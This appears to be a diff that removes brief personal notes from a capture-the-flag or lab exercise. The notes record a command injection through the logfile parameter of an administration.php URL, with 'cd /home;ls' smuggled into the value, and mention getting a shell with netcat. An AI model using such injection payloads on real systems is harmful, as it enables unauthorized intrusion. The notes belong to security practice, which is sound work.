@@ -1,6 +1,0 @@
-found start.sh
-from command injection 
-http://$IP:8080/administration.php?logfile=cd /home;ls
-
-got a shell using netcat and proceeded from there
-
